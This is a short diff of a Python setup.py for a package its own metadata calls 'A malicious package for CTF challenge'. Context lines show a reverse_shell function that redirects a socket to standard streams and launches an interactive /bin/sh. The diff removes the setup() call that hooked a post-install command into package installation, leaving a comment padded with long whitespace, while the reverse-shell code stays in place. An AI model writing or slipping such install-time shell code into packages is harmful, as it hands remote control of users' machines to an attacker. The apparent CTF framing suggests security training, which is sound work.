@@ -22,17 +22,4 @@ def reverse_shell(host, port):
     os.dup2(s.fileno(), 2)
     p = subprocess.call(["/bin/sh", "-i"])
 
-setup(
-    name='gkjzjh146',
-    version='1.3',
-    author='Your Name',
-    author_email='your_email@example.com',
-    description='A malicious package for CTF challenge',
-    packages=['gkjzjh146'],
-    install_requires=[
-        'requests',  # 举例：添加你需要的依赖项
-    ],
-    cmdclass={
-        'install': PostInstallCommand,
-    }
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                           
